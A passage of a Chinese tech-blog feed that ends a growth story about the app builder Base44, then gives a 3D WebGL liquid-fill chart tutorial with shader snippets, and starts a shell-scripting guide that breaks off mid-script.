<p>哪怕产品有了10万+用户后，他仍然每两周拉二三十个用户到线下，现<strong>场做 focus group，“盯着别人用产品”，再收集反馈快速迭代。</strong></p>
<p>产品体验上的每一个细节，都极度重视。</p>
<p>有多夸张？比如有用户抱怨部署繁琐，他马上加上了内置域名购买和自动部署功能；又比如有人反映只能用 Google 登录不方便，第二周就上线了多种登录方式（邮箱、微软、Facebook 等）。</p>
<p><strong>关键决策四：解决核心痛点，提升“首屏价值”</strong></p>
<p>base44 所有的迭代都围绕这个核心：<strong>消除用户摩擦，让产品价值“即时可见”</strong>。</p>
<p>用Maor的话就是：“用户的耐心极其有限，首屏必须让人眼前一亮。”</p>
<p>原本 Base44 设计了详细的“流程引导”，后来他果断砍掉，用户一进来直接看到自动生成的完整 App。这个调整直接让新用户激活率飙升 3 倍。</p>
<p>这也成就了**Base44最大的差异点，是真正实现了“傻瓜式生成”：一句提示语，连数据库、认证、支付、AI集成这些复杂功能都自动搞定，**极大地降低了用户入门门槛，加速了用户转化和激活。</p>
<p><strong>Part 3 爆发：有机增长与精准渠道策略</strong></p>
<p>相比大多数互联网项目“融资-烧钱-广告-增长”的老套路，Base44 的增长打法堪称反向操作：<strong>完全不投广告、不请 KOL、甚至不买量</strong>。</p>
<p>Maor 试过一次 influencer 合作和 Meta 广告，结果ROI很低，随即放弃，聚焦**“有机增长”。**</p>
<p><strong>关键决策五：聚焦优势渠道，精准B2B起量</strong></p>
<p>在2025年6月复盘增长时，Maor明确指出，<strong>联盟分发和自然增长优于付费广告</strong>（尽管他持续试验Meta Ads，但并未重仓）。</p>
<p>2025年7月上旬，他更是<strong>All-in LinkedIn</strong>，将Twitter作为次要分发渠道。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2fc2e15e2d24fccaec2932c1eb84438~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=Il3XITqWXj%2FItdMHfBE02cOH4zE%3D" alt="" loading="lazy"/></p>
<p>因为创始人清楚自己的目标用户是“不会写代码的小企业主和创业者”，这些群体在LinkedIn上的活跃度更高。将有限的精力聚焦在用户最集中的平台，通过内容分享和个人品牌构建，实现精准触达和高效转化。</p>
<p><strong>这些“去中心化增长”的做法，让 Base44 在上线 7 周就突破了 14 万用户，半年后已超 40 万注册用户，</strong></p>
<p>除此之外，base44 也在<strong>拓展企业级服务：</strong> 2025年7月9日，Base44发布了<strong>Workspaces（团队工作区）</strong>，支持团队协作、集中支付、私有集成和自托管DB。这是面向B2B场景的关键一步，为企业采购奠定了基础，进一步加速了营收增长。</p>
<p><strong>Part 4: 高光：8000万美金收购与AI时代的超级个体神话</strong></p>
<p>2025年6月18日，互联网巨头Wix宣布以高达8000万美金现金（含Earn-out）全资收购Base44。</p>
<p>此时，Base44仍是一个极简团队，没有外部融资。</p>
<p>在被收购后，Maor不仅在X上发布长文详细复盘了“零融资、极简组织”成功突围的原因，还在知名播客Lenny's Podcast上分享了所有的增长秘诀、AI技术栈和作为单人创始人的取舍。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c956d6fe6dd478dbbcf95127f193602~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=VYWszXuyb8OzSOFkJyVJy65mhuA%3D" alt="" loading="lazy"/></p>
<p>在收购后，Base44的业务仍在高速推进，2025年8月25日，创始人公布日ARR（年化经常性收入）已达40万美金，并在9月9日发布了<strong>Fast Mode（小于15秒建App）</strong>，将“首屏价值”的极致化体验推向新高度。</p>
<p>甚至烧了大量的钱在YouTube打广告，以至于我现在上 YouTube刷到的广告10个有8个可能就是 base44</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f045b301ed8f4d27a0e231395a5b6286~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=FgnS9QO9zDRw6wdNygMmitkY%2F64%3D" alt="" loading="lazy"/></p>
<p><strong>AI时代，人人皆有机会</strong></p>
<p>Base44的故事，不仅仅是一个关于赚钱速度的传奇，它更深远的意义在于：<strong>它代表了新一代AI工具，如何为“个人创始人”提供了前所未有的超级杠杆。</strong></p>
<p>不用依赖庞大团队、无需仰仗巨额风投，一个有洞察力、擅长利用AI工具、并敢于“公开构建”的个体，也能在AI时代撬动全球市场，实现快速变现，甚至打造出“单人独角兽”。</p>
<p>下一个Base44，说不定就是你。</p>
<p>这个时代，值得我们每个躬身入局者，去勇敢探索，去极致实践！</p>
<p>base44的完整时间线 html 我放到了公众号后台</p>
<p>关注公众号「饼干哥哥AGI」回复关键词「base44」即可</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ECharts 水球图不够炫？试试 RayChart 的创意可视化玩法]]></title>    <link>https://juejin.cn/post/7594681318828343346</link>    <guid>https://juejin.cn/post/7594681318828343346</guid>    <pubDate>2026-01-13T14:03:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594681318828343346" data-draft-id="7594681318828326962" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ECharts 水球图不够炫？试试 RayChart 的创意可视化玩法"/> <meta itemprop="keywords" content="前端,Vue.js,数据可视化"/> <meta itemprop="datePublished" content="2026-01-13T14:03:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一颗烂土豆"/> <meta itemprop="url" content="https://juejin.cn/user/764915822371912"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ECharts 水球图不够炫？试试 RayChart 的创意可视化玩法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/764915822371912/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一颗烂土豆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T14:03:12.000Z" title="Tue Jan 13 2026 14:03:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    28
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">有趣的3D图表水球：从 ECharts 到 RayChart 的升维打击</h2>
<p>在数据可视化大屏中，“水球图”（Liquid Fill Chart）绝对是展示百分比数据（如CPU使用率、完成度、剩余电量）的颜值担当。</p>
<p>大家最熟悉的莫过于 ECharts 的 <code>echarts-liquidfill</code> 插件。它简单、好用，但在这个“卷”视觉的时代，传统的 2D 扁平水球有时显得不够“震撼”。</p>
<p>今天我们来聊聊一个有趣的话题：<strong>如何用 RayChart 手搓一个真实的 3D 水球，并对比它与 ECharts 水球的区别。</strong>
<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">raychart体验地址：https://chart3js.netlify.app</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4949ebd87201477ba27c8988f19fdf6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6aKX54OC5Zyf6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768958523&amp;x-signature=TJ2c4eKzxSRHIymfSymBV6ymNLc%3D" alt="格式工厂 屏幕录像20260113_214646 00_00_00-00_00_37 00_00_00-00_00_30.gif" loading="lazy"/></p>
<h3 data-id="heading-1">1. 传统的 2D 做法：ECharts LiquidFill</h3>
<p>ECharts 的水球本质上是 <strong>2D Canvas/SVG 绘图</strong>。</p>
<h4 data-id="heading-2">原理</h4>
<p>它的“波浪”并不是真的流体，而是通过数学公式（通常是正弦函数 <code>y = A * sin(Bx + C) + D</code>）在 2D 平面上绘制出的闭合路径。通过不断改变相位（Offset），让曲线平移，从而产生“波动”的视觉错觉。</p>
<h4 data-id="heading-3">特点</h4>
<ul>
<li><strong>优点</strong>：
<ul>
<li><strong>性能极佳</strong>：几乎不占用 GPU 资源。</li>
<li><strong>兼容性好</strong>：甚至可以在不支持 WebGL 的环境运行。</li>
<li><strong>配置简单</strong>：几行配置就能搞定。</li>
</ul>
</li>
<li><strong>缺点</strong>：
<ul>
<li><strong>扁平</strong>：没有厚度，没有光影。</li>
<li><strong>质感单一</strong>：虽然可以加渐变色，但无法表现出水的折射、玻璃的通透感。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-4">2. 进阶的 3D 做法：RayChart 硬核实现</h3>
<p>为了追求“透亮”、“像真水一样”的效果，我们必须引入 <strong>WebGL</strong> 和 <strong>PBR（基于物理的渲染）</strong>。</p>
<p>在我的开源项目 <code>RayChart</code> 中，我实现了一个 <code>Liquid3D</code> 组件。下面来看看它是如何“骗”过你的眼睛的。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77a318afefe0493599a4f59c0397929c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6aKX54OC5Zyf6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768958523&amp;x-signature=yg88WTOtb83hP0UlY%2Fk74UnPU8U%3D" alt="ScreenShot_2026-01-13_215921_289.png" loading="lazy"/></p>
<h4 data-id="heading-5">核心构成</h4>
<p>一个真实的 3D 水球通常由三部分组成：</p>
<ol>
<li><strong>玻璃外壳</strong>：一个透明的球体容器。</li>
<li><strong>液体主体</strong>：球体内部被截断的下半部分。</li>
<li><strong>液体表面</strong>：一个随波浪起伏的顶盖。</li>
</ol>
<h4 data-id="heading-6">技术实现细节</h4>
<h5 data-id="heading-7">A. 玻璃外壳 (The Glass Shell)</h5>
<p>ECharts 很难做出的效果就是“玻璃感”。在 RayChart (基于 Three.js) 中，我们使用 <code>MeshPhysicalMaterial</code>，并开启 <code>transmission</code>（透光率）属性。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> shellMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshPhysicalMaterial</span>({
    <span class="hljs-attr">color</span>: <span class="hljs-number">0xffffff</span>,
    <span class="hljs-attr">transmission</span>: <span class="hljs-number">0.9</span>, <span class="hljs-comment">// 90% 透光，像玻璃一样</span>
    <span class="hljs-attr">roughness</span>: <span class="hljs-number">0</span>,      <span class="hljs-comment">// 极其光滑</span>
    <span class="hljs-attr">ior</span>: <span class="hljs-number">1.5</span>,          <span class="hljs-comment">// 折射率，模拟玻璃/水晶</span>
    <span class="hljs-attr">thickness</span>: <span class="hljs-number">0.5</span>,    <span class="hljs-comment">// 厚度，产生真实的折射效果</span>
    <span class="hljs-attr">transparent</span>: <span class="hljs-literal">true</span>
});
</code></pre>
<p>这让背景能够透过球体产生扭曲，质感瞬间拉满。</p>
<h5 data-id="heading-8">B. 液体主体：着色器里的“裁剪术”</h5>
<p>液体本身其实也是一个球体（<code>SphereGeometry</code>），但我们需要根据水位把它“切”开。</p>
<p>普通的 <code>clippingPlanes</code> 切出来是平的，没有波浪。所以我们需要写一点 Shader（着色器）。</p>
<p><strong>秘籍：</strong> 使用 <code>onBeforeCompile</code> 修改标准材质，在 Fragment Shader 中加入 <code>discard</code> 逻辑。</p>
<pre><code class="hljs language-glsl" lang="glsl">// GLSL 片段着色器伪代码
float h = getWaveHeight(vWorldPosition.x, vWorldPosition.z); // 计算波浪高度
// 如果当前像素的高度 &gt; 水位 + 波浪高度，就丢弃（不渲染）
if (vWorldPosition.y &gt; uLevelY + h) discard;
</code></pre>
<p>这样，原本完整的球体就被“切”出了一个起伏的边缘。</p>
<h5 data-id="heading-9">C. 液体表面：动态波浪</h5>
<p>被切掉的顶部不能空着，需要盖一个“盖子”。这个盖子是一个高密度的 <code>PlaneGeometry</code>。</p>
<p><strong>难点：</strong> 盖子的波动必须和球体的切口严丝合缝，否则会漏水。</p>
<p><strong>解决方案：</strong></p>
<ol>
<li><strong>几何同步</strong>：表面使用与主体完全相同的波浪公式（正弦波叠加）。</li>
<li><strong>圆形遮罩</strong>：因为 Plane 是方形的，我们需要在 Shader 里把超出球体半径的部分裁掉。</li>
</ol>
<pre><code class="hljs language-glsl" lang="glsl">// Vertex Shader: 让顶点随波浪起伏
vec3 pos = position;
float waveH = getWaveHeight(worldPos.x, worldPos.z);
pos.y += waveH; // 顶点置换

// Fragment Shader: 切成圆形
if (length(vUv - 0.5) * 2.0 &gt; 1.0) discard;
</code></pre>
<h3 data-id="heading-10">3. 终极对比：ECharts vs RayChart</h3>








































<table><thead><tr><th align="left">维度</th><th align="left">ECharts LiquidFill</th><th align="left">RayChart Liquid3D</th></tr></thead><tbody><tr><td align="left"><strong>渲染引擎</strong></td><td align="left">Canvas / SVG</td><td align="left">WebGL (Three.js)</td></tr><tr><td align="left"><strong>视觉维度</strong></td><td align="left">2D 平面</td><td align="left">3D 空间</td></tr><tr><td align="left"><strong>质感</strong></td><td align="left">色块、渐变、扁平阴影</td><td align="left"><strong>折射、反射、高光、环境光遮蔽</strong></td></tr><tr><td align="left"><strong>交互</strong></td><td align="left">鼠标悬浮高亮</td><td align="left">360度旋转、缩放、甚至可以晃动液体</td></tr><tr><td align="left"><strong>性能开销</strong></td><td align="left">⭐ (极低)</td><td align="left">⭐⭐⭐ (中高，依赖 GPU)</td></tr><tr><td align="left"><strong>适用场景</strong></td><td align="left">普通报表、H5 页面、移动端</td><td align="left"><strong>大屏可视化、数字孪生、高逼格演示</strong></td></tr></tbody></table>
<h3 data-id="heading-11">4. 总结</h3>
<ul>
<li>如果你需要一个<strong>快速加载、兼容性强</strong>的进度展示，<strong>ECharts</strong> 依然是首选。</li>
<li>如果你在做<strong>酷炫的数据大屏</strong>，想要那种“看起来很贵”的效果，<strong>RayChart</strong> 的 3D 水球绝对值得一试。</li>
</ul>
<p><strong>RayChart</strong> 项目正在探索更多这样的 3D 图表组件，希望能把 WebGL 的门槛降下来，让大家都能轻松用上“电影级”的图表。</p>
<hr/>
<p><em>觉得有趣的话，欢迎点赞收藏！</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Shell自动化编程完全指南]]></title>    <link>https://juejin.cn/post/7594389937459642378</link>    <guid>https://juejin.cn/post/7594389937459642378</guid>    <pubDate>2026-01-13T01:37:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389937459642378" data-draft-id="7594383365417795630" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Shell自动化编程完全指南"/> <meta itemprop="keywords" content="自动化运维"/> <meta itemprop="datePublished" content="2026-01-13T01:37:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="liux3528"/> <meta itemprop="url" content="https://juejin.cn/user/2701939431971706"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Shell自动化编程完全指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2701939431971706/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    liux3528
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:37:01.000Z" title="Tue Jan 13 2026 01:37:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">shell自动化编程详解</h2>
<h3 data-id="heading-1">一、shell自动化编程-基础与变量</h3>
<h4 data-id="heading-2">1.环境准备</h4>
<ul>
<li>修改vimrc文件，达到控制vim创建，编辑文件的动作 给文件添加注解
<ul>
<li>当前用户家目录下 ~/.vimrc</li>
<li>放在/etc/vimrc</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">set</span> ignorecase 
<span class="hljs-built_in">set</span> ignorecase
autocmd BufNewFile *.py,*.cc,*.sh,*.java <span class="hljs-built_in">exec</span> <span class="hljs-string">":call SetTitle()"</span>
func SetTitle()
<span class="hljs-keyword">if</span> <span class="hljs-built_in">expand</span>(<span class="hljs-string">"%:e"</span>) == <span class="hljs-string">'sh'</span>
call setline(1, <span class="hljs-string">"#!/bin/bash"</span>)
call setline(2,<span class="hljs-string">"########################################################"</span>)
call setline(3, <span class="hljs-string">"# File Name:"</span>.<span class="hljs-built_in">expand</span>(<span class="hljs-string">"%"</span>))
call setline(4, <span class="hljs-string">"# Version:V1.0"</span>)
call setline(5, <span class="hljs-string">"# Author:liux"</span>)
call setline(6, <span class="hljs-string">"# Desc:"</span>)
call setline(7,<span class="hljs-string">"########################################################"</span>)
endif
endfunc
</code></pre>
<h4 data-id="heading-3">2.shell脚本执行方式</h4>
<ul>
<li>通过sh或bash执行脚本                执行脚本最常用的方式</li>
<li>通过.（点）或source</li>
<li>！符号含义                                   用于指定脚本默认的命令解释器</li>
</ul>
<h4 data-id="heading-4">3.书写脚本每次用户登录后显示系统的基本信息</h4>
<pre><code class="hljs language-sh" lang="sh">vim 02.sys_login_info.sh
<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment"># File Name:02.sys_login_info.sh</span>
<span class="hljs-comment"># Version:V1.0</span>
<span class="hljs-comment"># Author:liux</span>
<span class="hljs-comment"># Desc:用户登录后显示系统基本信息</span>
<span class="hljs-comment">########################################################</span>

<span class="hljs-comment">#1.赋值</span>

sys_hostname=`hostname`
sys_ip_addrs=`hostname -I`
